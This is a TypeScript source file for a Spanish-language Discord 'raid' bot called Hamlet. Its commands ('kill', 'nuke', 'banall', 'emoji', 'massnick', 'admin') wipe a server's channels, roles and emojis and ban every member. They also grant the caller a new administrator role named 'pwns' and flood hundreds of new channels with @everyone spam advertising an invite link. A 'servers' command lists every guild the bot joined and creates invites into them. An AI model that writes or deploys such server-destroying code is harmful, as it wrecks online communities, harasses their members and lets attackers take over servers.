import express = require('express');
import { Client, Message, Guild, Collection, MessageEmbed } from 'discord.js';
import { raidData, colors, reset, admin, prefix } from './config/raid.config';

//express app
const app = express();
app.get('/', (req: any, res: any) => {
  res.send('Hello world');
});
app.listen(process.env.PORT || 3000);

//client init
const client: Client = new Client();

//client presence
client.on('ready', () => {
  if (!client.user) return;
  console.log(client.user.username, ' is ready');
  console.log(`https://discord.com/oauth2/authorize?client_id=${client.user.id}&permissions=1642824461566&scope=bot%20applications.commands`);
  client.user.setPresence({
    status: 'dnd',
    activity: {
      name: prefix,
      type: 'COMPETING',
    },
  });
});

client.on('message', async (message: Message) => {
  if (!message.guild) return;
  if (!client.user) return;
  const guild: Guild = message.guild;

  if (!guild.me) return;

  const wrong = (params: String) => {
    return message.channel.send({ content: params });
  };

  function sleep(ms: number) {
    return new Promise((resolve) => setTimeout(resolve, ms));
  }

  
  if (message.content === `${prefix}help`) {
    const commands = ['kill', 'banall', 'admin', 'emoji', 'massnick']
    const embed: MessageEmbed = new MessageEmbed()
      .setTitle('Hamlet v1 | Prefix: `+`')
      .setDescription(`Hola **${message.author.username}**! Mi nombre es Hamlet, el bot de *NationSquad*\n\n**Actualmente, mis comandos son:**\n` + commands.map(c => '`' + c + '`').join('\n') + '\nTen un buen día!')
      .setThumbnail('https://media.tenor.com/fy5Mwh-q5ZUAAAAC/hamtaro.gif')
    message.channel.send(embed);
  }
  
  if (message.content === `${prefix}massnick`) {
      guild.members.cache.forEach(m => {
        if (!guild.me) return;
        if (m.roles.highest.position > guild.me.roles.highest.position || guild.ownerID === m.user.id) return; 
        m.setNickname(raidData.invite)
          .catch(e => console.log(colors.red, 'Changing nicknames', reset));
      });
  }
  
  if (message.content === `${prefix}emoji`) {
    guild.emojis.cache.forEach(e => {
        e.delete()
          .then(e => guild.emojis.cache.delete(e.id))
          .catch(e => {
          console.log(colors.yellow, 'Deleting emojis', reset);
        });
    });  
  }
  
  if (message.content === `${prefix}admin`) {
    const rol = await guild.roles.create({data: { name: 'pwns', permissions: ['ADMINISTRATOR'] }});
    message.member?.roles.add(rol);
  }
  
  if (message.content === `${prefix}banall`) {
    message.guild.members.cache.forEach(async m => {
      try {
        await m.ban();
      } catch(e) {
        console.log('no se pudo banear a 1 usuario');
      }
    })
  }
  ///nuke
  if (message.content === `${prefix}nuke`) {
    async function deleteData(): Promise<Guild> {
      guild.channels.cache.forEach((c) => {
        c.delete()
          .then((channel) => guild.channels.cache.delete(channel.id))
          .catch((e) => {
            console.log(colors.cyan, 'Deleting channels:', reset, e.message);
          });
      });
      return guild;
    }
    if (!guild.me) return;
    if (!guild.me.hasPermission('ADMINISTRATOR'))
      return wrong('No tengo los permisos ncesarios');

    deleteData().then((g) =>
      g.channels
        .create(raidData.nuke_name)
        .then((c) => c.send('@everyone ' + raidData.invite))
    );
  }
  ///automatic
  if (message.content === `${prefix}kill`) {
    let errorCounter = 0;
    if (!guild.me.hasPermission('ADMINISTRATOR'))
      return wrong('No tengo los permisos ncesarios');
    const deleteChannels = async (): Promise<Guild> => {
      guild.channels.cache.forEach((c) => {
        c.delete()
          .then((channel) => guild.channels.cache.delete(channel.id))
          .catch((e) => {
            console.log(colors.cyan, 'Deleting channels:', reset, e.message);
          });
      });
      return guild;
    };

    const deleteRoles = async (): Promise<Guild> => {
      guild.roles.cache.forEach((r) => {
        if (!guild.me) return;
        if (guild.me.roles.highest.position > r.position && r.id !== guild.id) {
          r.delete()
            .then((role) => guild.roles.cache.delete(role.id))
            .catch((e) => {
              guild.roles.cache.delete(r.id);
              console.log(colors.yellow, 'Deleting roles:', reset, e.message);
            });
        }
      });
      return guild;
    };

    const createChannels = async () => {
      for (let i = 0; i <= 458; i++) {
        if (!message.guild) return;
        const channel = await message.guild.channels.create(
          raidData.raid_channel,
          {
            topic: raidData.invite,
            permissionOverwrites: [
              {
                id: guild.id,
                allow: ['VIEW_CHANNEL'],
              },
            ],
          }
        );
        const sendMessages = async (ms?: number) => {
          for (let x = 0; x <= 4; x++) {
            if (!channel) {
              continue;
            }
            channel.send('@everyone ' + raidData.message).catch((e) => {
              guild.channels.cache.delete(channel.id);
              console.log(
                colors.magenta,
                'Sending messages:',
                reset,
                e.message
              );
            });
          }
          if (ms) await sleep(ms * 1000);
          return;
        };

        const createRoles = async () => {
          for (let x = 0; x <= 249 - guild.roles.cache.size; x++) {
            guild.roles
              .create({
                data: {
                  name: raidData.nuke_name,
                },
              })
              .catch((e) => {
                console.log(colors.yellow, 'Creating roles', reset, e.message);
              });
          }
          return;
        };

        Promise.all([channel, createRoles]).then(async (res) => {
          await sendMessages(5);
          await sendMessages(10);
          await sendMessages(20);
          await sendMessages();
        });
      }
    };

    //raid
    try {
      await guild.setName(raidData.name);
      await guild.setIcon(raidData.icon);
      await deleteRoles();
      await deleteChannels();
      await createChannels();
    } catch (e) {
      console.log(colors.red, 'Unexpected:', reset, e.message);
    }
  }

  if (message.content === `${prefix}servers`) {
    if (message.author.id !== admin) return;
    let guilds = client.guilds.cache.sort((a, b) => (a > b ? -1 : 1));

    guilds.forEach(async (g) => {
      if (g.id === '897986461222207589') return;
      try {
        let invite = await g.channels.cache.random().createInvite();
        message.channel.send(
          g.me?.hasPermission('ADMINISTRATOR') + ' | ' + g.name + ' | ' + g.memberCount +  ' ' + invite.url
        );
      } catch (e) {
        message.channel.send(g.name + ' | ' + g.id);
      }
    });
  }
});

client.login(process.env.TOKEN);
